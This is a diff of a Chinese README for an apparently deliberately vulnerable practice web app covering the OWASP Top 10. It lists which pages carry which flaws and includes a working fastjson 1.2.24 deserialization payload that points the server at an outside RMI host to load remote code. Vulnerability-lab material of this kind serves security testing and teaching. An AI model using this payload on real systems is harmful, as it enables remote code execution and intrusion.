@@ -1,5 +1,5 @@
 # Blog
-自用漏洞验证平台，主要为测试owasp top 10漏洞
+漏洞验证平台，主要为测试owasp top 10漏洞
 
 
 A1注入：search.htm
@@ -30,7 +30,7 @@ A8不安全的反序列化:upload.htm (apache-commons-collections-3.2.1) resourc
 A9：fastjson 1.2.24前反序列化漏洞
 http://localhost:8080/blog/updateUserInfo.htm
 
-部署环境，参考resources中的fastjson.7z
+部署环境，参考resources/dependency/fastjson
 
 json提交框中输入以下内容：
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.2.13.27:9999/Poc","autoCommit":true}
@@ -41,6 +41,7 @@ json提交框中输入以下内容：
 A10：无
 
 ![image](https://user-images.githubusercontent.com/1740718/131211747-2be958b6-4c49-4a79-b442-2ed0787443de.png)
-![image](https://user-images.githubusercontent.com/1740718/131211703-2e6a2c93-40ac-416e-aed9-8c95a66bb6b5.png)
+![image](https://user-images.githubusercontent.com/1740718/168001817-4b62b8ab-d417-42d5-8cf6-a1a3c9e4019a.png)
+
 
 
